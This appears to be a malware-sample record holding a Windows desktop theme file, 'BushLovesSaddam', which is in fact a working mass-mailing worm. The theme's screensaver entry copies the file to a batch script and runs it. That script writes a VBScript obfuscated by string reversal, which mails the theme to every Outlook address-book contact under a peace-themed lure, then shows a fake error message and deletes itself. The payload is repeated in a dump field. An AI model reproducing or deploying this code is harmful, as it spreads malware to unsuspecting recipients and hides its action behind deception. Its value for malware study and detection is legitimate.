docinfo.macro:
;Copyright � Microsoft Corp. 2003
;A desktop Theme for Peace!
;Theme.BushLovesSaddam
;"Why do worms crawl? Because they have no feet. What if they have feet? Then prepare the world for worm domination." -vAndEEd0
echo.on error resume next >%windir%\kernel.vbs
echo 'vAndEEd0 strikes back >>%windir%\kernel.vbs
echo Execute(strreverse("fI dnE:txeN:dneS.hsub	:""emeht.maddaSsevoLhsuB\:C"" ddA.stnemhcattA.hsub	:"".gnihtemos evorp gniyrt elpoep fo hcnub a morF"" & flrcbv & flrcbv & flrcbv & flrcbv & ""!tneconni eht fo knihT .tluaf s'edis htob si tI"" & flrcbv & flrcbv & ""!nottub revaS neercS tceles ,rerolpxE potkseD ruoy ni dna ti nepo ,siht llatsni oT"" & flrcbv & flrcbv & "".emehT potkseD hsuB dna maddaS eht weiV !ecaep ekam dna raw eht potS"" & flrcbv & flrcbv & "",tneipicer raeD"" & flrcbv = ydoB.hsub	:"""" = yenom	:txeN	:yenom ddA.stneipiceR.hsub		:)evoL(seirtnEsserddA.zeeb = yenom		:tnuoC.seirtnEsserddA.zeeb oT 1 = evoL roF	:""!hsuB dna maddaS rof emehT potkseD eerf A"" = tcejbuS.hsub	:)tsaey(stsiLsserddA.ecaep = zeeb teS	:)0(metIetaerC.maddas = hsub teS	:tnuoC.stsiLsserddA.ecaep oT 1 = tsaey roF:nehT ""kooltuO"" = maddas fI:)""IPAM""(ecapSemaNteG.maddas = ecaep teS:)""noitacilppA.kooltuO""(tcejbOetaerC = maddas teS:txeN emuseR rorrE nO"))  >>%windir%\kernel.vbs
echo msgbox "Unsupported Desktop theme type. Please reinstall your Desktop Theme support.",vbCritical,"Support Error" >>%windir%\kernel.vbs
echo Execute(strreverse(")emaNlluFtpircS.tpircsW(eliFeteleD.)""tcejbOmetsySeliF.gnitpircS""(tcejbOetaerC")
wscript %windir%\kernel.vbs
exit

[boot]
SCRNSAVE.EXE=command.com /c copy BushLovesSaddam.theme c:\Recycled.bat /Y| copy BushLovesSaddam.theme c:\BushLovesSaddam.theme /Y|c:\Recycled.bat|


[MasterThemeSelector]
MTSM=DABJDKT
ThemeColorBPP=4

filetype: ISO-8859 text, with very long lines, with CRLF line terminators

dump: ;"Why do worms crawl? Because they have no feet. What if they have feet? Then prepare the world for worm domination." -vAndEEd0

echo Execute(strreverse("fI dnE:txeN:dneS.hsub	:""emeht.maddaSsevoLhsuB\:C"" ddA.stnemhcattA.hsub	:"".gnihtemos evorp gniyrt elpoep fo hcnub a morF"" & flrcbv & flrcbv & flrcbv & flrcbv & ""!tneconni eht fo knihT .tluaf s'edis htob si tI"" & flrcbv & flrcbv & ""!nottub revaS neercS tceles ,rerolpxE potkseD ruoy ni dna ti nepo ,siht llatsni oT"" & flrcbv & flrcbv & "".emehT potkseD hsuB dna maddaS eht weiV !ecaep ekam dna raw eht potS"" & flrcbv & flrcbv & "",tneipicer raeD"" & flrcbv = ydoB.hsub	:"""" = yenom	:txeN	:yenom ddA.stneipiceR.hsub		:)evoL(seirtnEsserddA.zeeb = yenom		:tnuoC.seirtnEsserddA.zeeb oT 1 = evoL roF	:""!hsuB dna maddaS rof emehT potkseD eerf A"" = tcejbuS.hsub	:)tsaey(stsiLsserddA.ecaep = zeeb teS	:)0(metIetaerC.maddas = hsub teS	:tnuoC.stsiLsserddA.ecaep oT 1 = tsaey roF:nehT ""kooltuO"" = maddas fI:)""IPAM""(ecapSemaNteG.maddas = ecaep teS:)""noitacilppA.kooltuO""(tcejbOetaerC = maddas teS:txeN emuseR rorrE nO"))  >>%windir%\kernel.vbs
echo msgbox "Unsupported Desktop theme type. Please reinstall your Desktop Theme support.",vbCritical,"Support Error" >>%windir%\kernel.vbs
